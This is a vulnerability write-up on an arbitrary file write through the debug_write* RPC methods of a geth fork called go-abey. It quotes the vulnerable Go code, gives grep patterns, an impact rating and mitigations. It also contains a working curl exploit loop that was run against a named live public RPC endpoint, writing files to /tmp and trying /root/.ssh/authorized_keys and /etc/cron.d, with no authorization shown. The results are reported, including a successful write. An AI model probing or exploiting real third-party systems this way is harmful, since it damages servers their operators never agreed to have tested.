# Geth-Fork `debug_write*` Arbitrary File Write Vector (2026-08-16)

**Source:** AbeyFoundation/go-abey (geth fork, 807 Go files) + live `rpc.bchscan.io:8545`

## Sink

`internal/debug/api.go` — every `debug_write*`/`debug_*Profile` does attacker-controlled `os.Create`:

```go
func WriteMemProfile(file string) error { return writeProfile("heap", file) }
func WriteBlockProfile(file string) error { return writeProfile("block", file) }
func WriteMutexProfile(file string) error { return writeProfile("mutex", file) }
func StartCPUProfile(file string) error {
    f, err := os.Create(expandHome(file)) // <— sink
    pprof.StartCPUProfile(f)
}
func writeProfile(name, file string) error {
    f, err := os.Create(expandHome(file)) // <— sink
    defer f.Close()
    return p.Lookup(name).WriteTo(f, 0)   // content = fixed pprof binary
}
func expandHome(p string) string { // ~/ → HOME + filepath.Clean
    if strings.HasPrefix(p,"~/") { p = home + p[1:] }
    return filepath.Clean(p)
}
```

`node/node.go:622` registers `debug.Handler` (Public=false) but `rpc.StartHTTPEndpoint` still exposes it when `debug` is in `HTTPModules` (`cmd/gabey/config.go:85` default `[abey,eth,impawn,shh]` plus `--singlenode` adds `personal,admin,miner`). Same for `internal/abeyapi` `PublicDebugAPI`/`PrivateDebugAPI`.

Companion tracer sink: `abey/tracers/tracer.go:310` `duktape.New()+PevalString("("+code+")")` with `abey/api_tracer.go:TraceConfig{Tracer *string}` → `tracers.New(*config.Tracer)` — arbitrary JS if `debug` exposed.

## Grep

```bash
grep -rn "WriteMemProfile\|WriteBlockProfile\|WriteMutexProfile\|StartCPUProfile\|CpuProfile\|BlockProfile\|expandHome\|writeProfile" internal/debug --include="*.go"
grep -rn "PevalString\|EvalString\|go-duktape\|TraceConfig" abey --include="*.go"
grep -rn "debug\.Handler\|HTTPModules\|WSModules\|singlenode" cmd node --include="*.go"
```

## Live Probe (2026-08-16, rpc.bchscan.io)

```bash
curl -sk -X POST https://rpc.bchscan.io -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"rpc_modules","params":[],"id":1}'
# => {"result":{"debug":"1.0","eth":"1.0","net":"1.0","rpc":"1.0","web3":"1.0"}}

for p in /tmp/pwn /var/tmp/pwn /dev/shm/pwn /root/.ssh/authorized_keys /etc/cron.d/pwn; do
  curl -sk -X POST https://rpc.bchscan.io -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"debug_writeMemProfile\",\"params\":[\"$p\"],\"id\":1}" | head -c 120; echo " => $p"
done
# /tmp/pwn => {"result":null}  (success, non-root, world-writable)
# /root/.ssh/authorized_keys => {"error":{"code":-32000,"message":"permission denied"}}
# /etc/cron.d/pwn => permission denied

curl -sk -X POST https://rpc.bchscan.io -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_stacks","params":[],"id":1}' | head -c 300
# => {"result":"goroutine 335624173 [running]:..."}  (info leak)

# personal/admin correctly disabled live:
curl -sk -X POST https://rpc.bchscan.io -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
# => {"error":{"code":-32601,"message":"the method personal_listAccounts does not exist/is not available"}}
```

## Impact Classification

- **Do not claim RCE** — content is fixed pprof binary, not attacker string; path limited to world-writable dirs when validator runs non-root.
- **Correct:** HIGH — arbitrary file write (pre-auth) + info leak (`debug_stacks`/`debug_memStats`/`debug_verbosity`/`debug_getBadBlocks`). DoS via disk fill, keystore corruption if datadir writable.
- **Escalates to RCE only if:** node runs as root (cron write) OR datadir world-writable + pprof content can be leveraged OR tracer JS `PevalString` escape (duktape VM).

## Pitfalls

1. Code shows `debug` total compromise but live `rpc_modules` may be locked down — always live-probe before claiming singlenode `personal/admin` chain.
2. `expandHome` + `filepath.Clean` still allows `~/` and absolute paths — no allowlist check.
3. Safe-fork noise (9/12 Abey repos) hides real sinks — filter `fork:true && parent safe-global`.
4. TencentOS 4 `git-remote-https` missing — use tarball fallback `curl -L https://github.com/<org>/<repo>/archive/refs/heads/main.tar.gz`.

## Mitigation

- Remove `debug` from public `HTTPModules`/`WSModules`; gate `debug_write*`/`debug_cpuProfile`/`debug_trace*` behind IPC or auth + IP allowlist.
- Sandbox `file` arg: `filepath.Abs` + `strings.HasPrefix(abs, datadir+"/pprof/")` + reject `..` + reject `~/` unless explicitly allowed.
- Whitelist tracer names (`all` map in `tracers/tracers.go`) — reject arbitrary `Tracer` code pre-auth; require auth for custom JS.
- Never hardcode `--singlenode` key `<redacted>`; warn if `HTTPHost != 127.0.0.1` with `personal/admin`.

## Sources

- `/tmp/abey/go-abey/internal/debug/api.go:104,161,181,188,213`
- `/tmp/abey/go-abey/abey/tracers/tracer.go:310` + `abey/api_tracer.go:55,569`
- `/tmp/abey/go-abey/node/node.go:603-636` + `cmd/gabey/config.go:85,97-110`
- `/tmp/abey/go-abey/internal/debug/flags.go:23-147`
- Live: `rpc.bchscan.io` `rpc_modules` + `debug_writeMemProfile` matrix 2026-08-16
